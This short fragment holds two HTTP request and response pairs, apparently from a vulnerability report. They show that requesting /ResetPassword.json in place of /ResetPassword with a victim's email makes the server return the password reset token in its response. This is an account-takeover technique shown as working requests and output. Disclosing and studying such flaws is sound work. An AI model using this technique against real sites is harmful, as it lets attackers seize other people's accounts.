	Request:
	GET /ResetPassword HTTP/1.1
	{"email":"victim@example.com"}

	Response:
	HTTP/1.1 200 OK

	Request:
	GET /ResetPassword.json HTTP/1.1
	{"email":"victim@example.com"}

	Response:
	HTTP/1.1 200 OK
	{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-edc8a"}